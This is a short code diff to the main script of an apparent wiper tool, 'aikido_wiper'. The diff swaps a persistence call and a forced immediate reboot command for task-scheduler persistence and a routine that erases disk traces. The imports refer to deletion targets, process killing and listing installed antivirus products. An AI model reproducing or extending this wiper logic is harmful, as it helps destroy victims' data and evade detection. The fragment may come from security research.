@@ -1,9 +1,9 @@
-import os
 import time
 
 from aikido_wiper.wipe_utils import erase_disk_traces
-from configs.args import parse_args, create_proxy_from_conf, find_deletion_targets_from_args
-from aikido_wiper.windows_utils import stay_persistent_with_args, kill_process_window, get_existing_anti_virus_display_names     
+from configs.args import erase_traces_based_on_args, parse_args, create_proxy_from_conf, find_deletion_targets_from_args
+from aikido_wiper.windows_utils import task_scheduler_stay_persistent_with_args, kill_process_window
+
 
 
 def main():
@@ -31,8 +31,7 @@ def main():
 
     print(f"The deletion took {after - before} seconds")
 
-    stay_persistent_with_args(cmd_args="-q ERASE_DISK_TRACES")
-    os.system("shutdown -t 0 -r -f")
+    erase_traces_based_on_args(args)
 
     return 0
 
